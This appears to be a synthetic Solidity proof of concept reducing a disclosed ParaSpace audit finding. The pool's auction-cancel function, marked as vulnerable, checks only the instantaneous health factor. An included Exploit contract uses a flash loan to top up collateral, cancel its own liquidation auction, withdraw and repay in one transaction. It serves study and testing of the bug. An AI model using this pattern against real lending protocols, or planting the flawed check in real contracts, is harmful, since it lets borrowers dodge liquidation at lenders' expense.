// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  ParaSpace — [H-07] User can pass auction recovery health check easily with flashloan
    (Code4rena 2022-11-paraspace; #15980, reporter Trust)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: setAuctionValidityTime() only checks the account's instantaneous health
    factor. A flash borrower can add collateral, cancel the auction, remove that
    collateral, and repay in the same transaction. The blamed health-check/validity
    transition is preserved below (@> VULN).
*/

contract MockWETH {
    string public constant name = "Wrapped Ether";
    string public constant symbol = "WETH";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "WETH: balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "WETH: balance");
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "WETH: allowance");
        allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

interface IFlashLoanReceiver {
    function onFlashLoan(address token, uint256 amount) external;
}

contract FlashLender {
    MockWETH public immutable token;

    constructor(MockWETH _token) {
        token = _token;
        _token.mint(address(this), 1_000 ether);
    }

    function flashLoan(IFlashLoanReceiver receiver, uint256 amount) external {
        uint256 balanceBefore = token.balanceOf(address(this));
        require(amount <= balanceBefore, "flash amount");
        require(token.transfer(address(receiver), amount), "flash transfer");
        receiver.onFlashLoan(address(token), amount);
        require(token.balanceOf(address(this)) >= balanceBefore, "flash not repaid");
    }
}

contract ParaSpacePool {
    struct UserConfig {
        uint256 debt;
        uint256 collateral;
        bool auctionActive;
        uint256 auctionValidityTime;
    }

    MockWETH public immutable weth;
    uint256 public constant AUCTION_RECOVERY_HEALTH_FACTOR = 150;
    mapping(address => UserConfig) public userConfig;

    constructor(MockWETH _weth) {
        weth = _weth;
    }

    // The NFT/debt position is seeded solely to make the reduced auction path local.
    function seedPosition(address user, uint256 debt, uint256 collateral) external {
        userConfig[user] = UserConfig({
            debt: debt,
            collateral: collateral,
            auctionActive: true,
            auctionValidityTime: 0
        });
    }

    function healthFactor(address user) public view returns (uint256) {
        UserConfig memory cfg = userConfig[user];
        if (cfg.debt == 0) return type(uint256).max;
        return (cfg.collateral * 100) / cfg.debt;
    }

    function supply(uint256 amount) external {
        require(weth.transferFrom(msg.sender, address(this), amount), "supply transfer");
        userConfig[msg.sender].collateral += amount;
    }

    function withdraw(uint256 amount) external {
        UserConfig storage cfg = userConfig[msg.sender];
        require(cfg.collateral >= amount, "withdraw collateral");
        cfg.collateral -= amount;
        require(weth.transfer(msg.sender, amount), "withdraw transfer");
    }

    /// @notice Cancel a pending NFT auction after the borrower recovers above the threshold.
    function setAuctionValidityTime() external {
        UserConfig storage cfg = userConfig[msg.sender];
        uint256 erc721HealthFactor = healthFactor(msg.sender);
        require(
            erc721HealthFactor > AUCTION_RECOVERY_HEALTH_FACTOR,
            "ERC721 health factor not above threshold"
        );
        cfg.auctionValidityTime = block.timestamp; // @> VULN: instantaneous collateral is enough to cancel
        // FIX: hold the collateral for a delay (at least five minutes) before cancelling auctions.
        cfg.auctionActive = false;
    }

    function collateralOf(address user) external view returns (uint256) {
        return userConfig[user].collateral;
    }

    function debtOf(address user) external view returns (uint256) {
        return userConfig[user].debt;
    }

    function auctionActive(address user) external view returns (bool) {
        return userConfig[user].auctionActive;
    }
}

contract Exploit is IFlashLoanReceiver {
    MockWETH public token; // CREATE 1
    ParaSpacePool public pool; // CREATE 2 — vulnerable
    FlashLender public lender; // CREATE 3

    uint256 public constant POSITION_DEBT = 100 ether;
    uint256 public constant POSITION_COLLATERAL = 100 ether;
    uint256 public constant FLASH_AMOUNT = 1_000 ether;

    constructor() {
        token = new MockWETH();
        pool = new ParaSpacePool(token);
        lender = new FlashLender(token);
        pool.seedPosition(address(this), POSITION_DEBT, POSITION_COLLATERAL);
    }

    function run() external {
        require(pool.auctionActive(address(this)), "auction not active");
        require(pool.healthFactor(address(this)) == 100, "position should be underwater");

        // The lender funds a one-transaction collateral top-up.
        lender.flashLoan(this, FLASH_AMOUNT);

        // The flash collateral was removed and repaid, but the auction remains cancelled.
        require(!pool.auctionActive(address(this)), "auction was not cancelled");
        require(pool.collateralOf(address(this)) == POSITION_COLLATERAL, "flash collateral stuck");
        require(pool.debtOf(address(this)) == POSITION_DEBT, "debt unexpectedly changed");
        require(pool.healthFactor(address(this)) == 100, "position was not restored");
    }

    function onFlashLoan(address tokenAddress, uint256 amount) external override {
        require(msg.sender == address(lender), "untrusted lender");
        require(tokenAddress == address(token) && amount == FLASH_AMOUNT, "bad flash loan");
        token.approve(address(pool), amount);
        pool.supply(amount);
        require(pool.healthFactor(address(this)) > pool.AUCTION_RECOVERY_HEALTH_FACTOR(), "top-up failed");
        pool.setAuctionValidityTime();
        pool.withdraw(amount);
        require(token.transfer(address(lender), amount), "repayment failed");
    }
}
